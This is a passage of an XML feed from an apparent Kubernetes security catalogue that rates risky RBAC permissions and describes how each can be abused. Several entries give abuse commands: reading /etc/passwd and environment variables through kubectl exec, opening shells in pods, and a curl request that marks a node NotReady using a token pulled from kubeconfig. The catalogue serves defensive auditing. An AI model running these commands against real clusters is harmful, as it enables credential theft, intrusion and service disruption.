&lt;p>Allows modifying node configurations, such as labels and taints, across the cluster. This can be abused to influence pod scheduling, potentially forcing sensitive workloads onto compromised nodes or causing denial of service by misconfiguring taints. It can also be a step towards privilege escalation.&lt;/p></description></item><item><title>Modify secrets cluster-wide</title><link>https://rbac-atlas.github.io/rules/1012/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1012/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1012&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Modify secrets cluster-wide&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Tampering&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>secrets&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-clusterwidesecretaccess">&lt;a href="https://rbac-atlas.github.io/tags/clusterwidesecretaccess/">ClusterWideSecretAccess&lt;/a>&lt;/span>
 &lt;span class="tag-persistence">&lt;a href="https://rbac-atlas.github.io/tags/persistence/">Persistence&lt;/a>&lt;/span>
 &lt;span class="tag-privilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/privilegeescalation/">PrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows creating, updating, patching, or deleting secrets in any namespace across the cluster. This is highly critical as it enables an attacker to inject malicious credentials, tamper with existing secrets, or delete critical ones, leading to privilege escalation, persistence, and service disruption.&lt;/p></description></item><item><title>Modify secrets in a namespace</title><link>https://rbac-atlas.github.io/rules/1013/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1013/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1013&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Modify secrets in a namespace&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Tampering&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>secrets&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-persistence">&lt;a href="https://rbac-atlas.github.io/tags/persistence/">Persistence&lt;/a>&lt;/span>
 &lt;span class="tag-potentialprivilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/potentialprivilegeescalation/">PotentialPrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-secretaccess">&lt;a href="https://rbac-atlas.github.io/tags/secretaccess/">SecretAccess&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Grants permission to create, update, patch, or delete secrets within a specific namespace. This allows an attacker to tamper with sensitive credentials, potentially escalate privileges by modifying service account tokens or application secrets, and establish persistence within that namespace.&lt;/p></description></item><item><title>Namespaced pod attach</title><link>https://rbac-atlas.github.io/rules/1003/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1003/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1003&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Namespaced pod attach&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-high">High&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>pods/attach&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-codeexecution">&lt;a href="https://rbac-atlas.github.io/tags/codeexecution/">CodeExecution&lt;/a>&lt;/span>
 &lt;span class="tag-lateralmovement">&lt;a href="https://rbac-atlas.github.io/tags/lateralmovement/">LateralMovement&lt;/a>&lt;/span>
 &lt;span class="tag-podattach">&lt;a href="https://rbac-atlas.github.io/tags/podattach/">PodAttach&lt;/a>&lt;/span>
 &lt;span class="tag-potentialprivilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/potentialprivilegeescalation/">PotentialPrivilegeEscalation&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows attaching to the input/output streams of pods within a specific namespace. This can provide interactive access to containers in that namespace, risking code execution, lateral movement, and potential privilege escalation through compromised workloads.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Attach to a running container&amp;rsquo;s process within the namespace.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl attach -it &amp;lt;pod-name&amp;gt; -n &amp;lt;namespace&amp;gt; -c &amp;lt;container-name&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: Attach to a logging agent pod in the &amp;#39;monitoring&amp;#39; namespace&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># kubectl attach -it fluentd-xyz -n monitoring -c fluentd&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Namespaced pod exec</title><link>https://rbac-atlas.github.io/rules/1001/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1001/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1001&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Namespaced pod exec&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-high">High&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>pods/exec&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-codeexecution">&lt;a href="https://rbac-atlas.github.io/tags/codeexecution/">CodeExecution&lt;/a>&lt;/span>
 &lt;span class="tag-lateralmovement">&lt;a href="https://rbac-atlas.github.io/tags/lateralmovement/">LateralMovement&lt;/a>&lt;/span>
 &lt;span class="tag-podexec">&lt;a href="https://rbac-atlas.github.io/tags/podexec/">PodExec&lt;/a>&lt;/span>
 &lt;span class="tag-potentialprivilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/potentialprivilegeescalation/">PotentialPrivilegeEscalation&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Permits executing commands within pods in a specific namespace. This grants shell access to containers within that namespace, potentially leading to code execution, lateral movement within the namespace, and privilege escalation if sensitive workloads or service accounts are compromised.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Execute a non-interactive command inside a specific pod within the namespace.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl &lt;span class="nb">exec&lt;/span> &amp;lt;pod-name&amp;gt; -n &amp;lt;namespace&amp;gt; -- cat /etc/passwd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl exec my-app-pod-xyz -n default -- env&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Obtain an interactive shell inside a specific pod within the namespace.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl &lt;span class="nb">exec&lt;/span> -it &amp;lt;pod-name&amp;gt; -n &amp;lt;namespace&amp;gt; -- sh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl exec -it my-database-pod -n production -- bash&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Namespaced pod port-forward</title><link>https://rbac-atlas.github.io/rules/1005/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1005/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1005&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Namespaced pod port-forward&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Information Disclosure&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-medium">Medium&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>pods/portforward&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-lateralmovement">&lt;a href="https://rbac-atlas.github.io/tags/lateralmovement/">LateralMovement&lt;/a>&lt;/span>
 &lt;span class="tag-networkmanipulation">&lt;a href="https://rbac-atlas.github.io/tags/networkmanipulation/">NetworkManipulation&lt;/a>&lt;/span>
 &lt;span class="tag-podportforward">&lt;a href="https://rbac-atlas.github.io/tags/podportforward/">PodPortForward&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Permits forwarding local ports to ports on pods within a specific namespace. This can expose internal services within that namespace, enable lateral movement, and potentially lead to information disclosure from applications not intended for external access.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Forward a local port to a port on a specific pod within the namespace.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl port-forward &amp;lt;pod-name&amp;gt; -n &amp;lt;namespace&amp;gt; &amp;lt;local-port&amp;gt;:&amp;lt;pod-port&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: Forward local port 3000 to port 3000 of a frontend pod&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># kubectl port-forward my-frontend-pod -n default 3000:3000&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Node proxy access (Kubelet API)</title><link>https://rbac-atlas.github.io/rules/1014/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1014/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1014&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Node proxy access (Kubelet API)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>nodes/proxy&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>get, create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-clusteradminaccess">&lt;a href="https://rbac-atlas.github.io/tags/clusteradminaccess/">ClusterAdminAccess&lt;/a>&lt;/span>
 &lt;span class="tag-codeexecution">&lt;a href="https://rbac-atlas.github.io/tags/codeexecution/">CodeExecution&lt;/a>&lt;/span>
 &lt;span class="tag-dataexposure">&lt;a href="https://rbac-atlas.github.io/tags/dataexposure/">DataExposure&lt;/a>&lt;/span>
 &lt;span class="tag-lateralmovement">&lt;a href="https://rbac-atlas.github.io/tags/lateralmovement/">LateralMovement&lt;/a>&lt;/span>
 &lt;span class="tag-nodeaccess">&lt;a href="https://rbac-atlas.github.io/tags/nodeaccess/">NodeAccess&lt;/a>&lt;/span>
 (+1 more)&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Provides direct access to the Kubelet API on any node in the cluster. This is equivalent to cluster admin access, allowing an attacker to run commands on nodes, access pod logs, execute commands in containers, and retrieve sensitive information directly from the nodes, leading to full cluster compromise.&lt;/p></description></item><item><title>Patch node status cluster-wide</title><link>https://rbac-atlas.github.io/rules/1069/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1069/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1069&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Patch node status cluster-wide&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Tampering&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-high">High&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>nodes/status&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>patch, update&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-nodemanipulation">&lt;a href="https://rbac-atlas.github.io/tags/nodemanipulation/">NodeManipulation&lt;/a>&lt;/span>
 &lt;span class="tag-schedulingabuse">&lt;a href="https://rbac-atlas.github.io/tags/schedulingabuse/">SchedulingAbuse&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows patching the status of any node in the cluster. This can be abused to mark nodes as (un)healthy or (un)schedulable, impacting workload scheduling, potentially tricking controllers, or causing denial of service.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Patch a node&amp;rsquo;s status to mark it as &amp;lsquo;NotReady&amp;rsquo;, causing pods to be evicted.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Replace &amp;lt;kubernetes-api-server&amp;gt; with your API server address&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Replace &amp;lt;token&amp;gt; with your authentication token&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">curl -k -H &lt;span class="s2">&amp;#34;Authorization: Bearer &amp;lt;token&amp;gt;&amp;#34;&lt;/span> -H &lt;span class="s2">&amp;#34;Content-Type: application/json&amp;#34;&lt;/span> -X PATCH &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> --data &lt;span class="s1">&amp;#39;{&amp;#34;status&amp;#34;:{&amp;#34;conditions&amp;#34;:[{&amp;#34;type&amp;#34;:&amp;#34;Ready&amp;#34;,&amp;#34;status&amp;#34;:&amp;#34;False&amp;#34;,&amp;#34;reason&amp;#34;:&amp;#34;KubeletStopped&amp;#34;,&amp;#34;message&amp;#34;:&amp;#34;Kubelet stopped posting node status.&amp;#34;}]}}&amp;#39;&lt;/span> &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> https://&amp;lt;kubernetes-api-server&amp;gt;/api/v1/nodes/&amp;lt;node-name&amp;gt;/status
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: curl -k -H &amp;#34;Authorization: Bearer $(cat ~/.kube/config | grep token: | awk &amp;#39;{print $2}&amp;#39;)&amp;#34; -H &amp;#34;Content-Type: application/json&amp;#34; -X PATCH --data &amp;#39;{&amp;#34;status&amp;#34;:{&amp;#34;conditions&amp;#34;:[{&amp;#34;type&amp;#34;:&amp;#34;Ready&amp;#34;,&amp;#34;status&amp;#34;:&amp;#34;False&amp;#34;,&amp;#34;reason&amp;#34;:&amp;#34;KubeletStopped&amp;#34;,&amp;#34;message&amp;#34;:&amp;#34;Kubelet stopped posting node status.&amp;#34;}]}}&amp;#39; https://127.0.0.1:6443/api/v1/nodes/minikube/status&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Read All ResourceQuotas (Cluster-wide Information Disclosure)</title><link>https://rbac-atlas.github.io/rules/1089/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1089/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1089&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Read All ResourceQuotas (Cluster-wide Information Disclosure)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Information Disclosure&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-medium">Medium&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>resourcequotas&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>get, list, watch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-informationdisclosure">&lt;a href="https://rbac-atlas.github.io/tags/informationdisclosure/">InformationDisclosure&lt;/a>&lt;/span>
 &lt;span class="tag-quotatampering">&lt;a href="https://rbac-atlas.github.io/tags/quotatampering/">QuotaTampering&lt;/a>&lt;/span>
 &lt;span class="tag-reconnaissance">&lt;a href="https://rbac-atlas.github.io/tags/reconnaissance/">Reconnaissance&lt;/a>&lt;/span>
 &lt;span class="tag-resourceconfiguration">&lt;a href="https://rbac-atlas.github.io/tags/resourceconfiguration/">ResourceConfiguration&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows reading ResourceQuota objects across all namespaces. This provides a comprehensive view of resource limits cluster-wide, aiding attackers in identifying broadly constrained or privileged namespaces and overall resource allocation strategies.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>List all ResourceQuotas across all namespaces.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl get resourcequotas --all-namespaces
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Read ComponentStatuses (Control Plane Reconnaissance)</title><link>https://rbac-atlas.github.io/rules/1095/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1095/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1095&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Read ComponentStatuses (Control Plane Reconnaissance)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Information Disclosure&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-medium">Medium&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>componentstatuses&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>get, list&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-controlplanedisruption">&lt;a href="https://rbac-atlas.github.io/tags/controlplanedisruption/">ControlPlaneDisruption&lt;/a>&lt;/span>
 &lt;span class="tag-informationdisclosure">&lt;a href="https://rbac-atlas.github.io/tags/informationdisclosure/">InformationDisclosure&lt;/a>&lt;/span>
 &lt;span class="tag-reconnaissance">&lt;a href="https://rbac-atlas.github.io/tags/reconnaissance/">Reconnaissance&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows reading ComponentStatus objects, which show the health of control plane components like etcd, kube-scheduler, and kube-controller-manager. This can reveal operational weaknesses, vulnerabilities, or misconfigurations in the cluster&amp;rsquo;s core.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>List the health status of core Kubernetes components.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl get componentstatuses
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Read ConfigMaps cluster-wide</title><link>https://rbac-atlas.github.io/rules/1022/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1022/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1022&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Read ConfigMaps cluster-wide&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Information Disclosure&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-high">High&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>configmaps&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>get, list, watch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-configmapaccess">&lt;a href="https://rbac-atlas.github.io/tags/configmapaccess/">ConfigMapAccess&lt;/a>&lt;/span>
 &lt;span class="tag-dataexposure">&lt;a href="https://rbac-atlas.github.io/tags/dataexposure/">DataExposure&lt;/a>&lt;/span>
 &lt;span class="tag-informationdisclosure">&lt;a href="https://rbac-atlas.github.io/tags/informationdisclosure/">InformationDisclosure&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
